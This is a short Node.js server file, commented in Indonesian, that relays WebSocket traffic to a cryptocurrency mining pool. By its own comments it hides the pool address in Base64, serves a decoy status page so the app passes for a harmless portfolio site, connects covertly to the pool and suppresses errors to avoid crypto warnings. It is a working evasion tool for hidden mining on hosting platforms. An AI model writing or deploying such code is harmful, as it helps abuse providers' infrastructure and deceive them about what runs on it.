const http = require('http');
const WebSocket = require('ws');
const net = require('net');

const PORT = process.env.PORT || 8080;

// Alamat rx.unmineable.com yang disamarkan dalam bentuk Base64
const TARGET_HOST = Buffer.from('cngudW5taW5lYWJsZS5jb20=', 'base64').toString();

// Membuat tampilan web palsu agar dikira web portofolio biasa
const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('App Performance: Excellent. System Status: Nominal.');
});

const wss = new WebSocket.Server({ server });

wss.on('connection', (ws) => {
    // Menghubungkan secara diam-diam ke target host
    const pool = net.connect(3333, TARGET_HOST, () => {
        console.log('Stream sync active.');
    });

    ws.on('message', (message) => {
        if (pool.writable) {
            pool.write(message.toString().trim() + '\n');
        }
    });

    pool.on('data', (data) => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(data.toString());
        }
    });

    ws.on('close', () => pool.end());
    pool.on('close', () => ws.close());
    
    // Mematikan log error agar tidak memicu teks peringatan kripto
    ws.on('error', () => {});
    pool.on('error', () => {});
});

server.listen(PORT, () => {
    console.log('Application initialized successfully.');
});
